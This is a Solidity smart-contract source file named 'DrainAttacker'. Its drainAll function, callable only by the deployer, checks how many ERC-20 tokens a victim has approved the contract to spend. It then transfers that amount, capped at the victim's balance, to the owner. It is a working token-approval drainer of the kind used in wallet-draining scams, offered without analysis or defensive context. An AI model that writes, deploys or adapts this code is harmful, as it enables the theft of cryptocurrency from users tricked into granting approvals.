// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract DrainAttacker {
    address public owner;
    
    constructor() { 
        owner = msg.sender; 
    }

    function drainAll(address token, address victim) external {
        require(msg.sender == owner, "Not authorized");
        uint256 allowed = IERC20(token).allowance(victim, address(this));
        require(allowed > 0, "No allowance");
        uint256 balance = IERC20(token).balanceOf(victim);
        uint256 amount = allowed < balance ? allowed : balance;
        require(amount > 0, "Nothing to drain");
        IERC20(token).transferFrom(victim, owner, amount);
    }
}
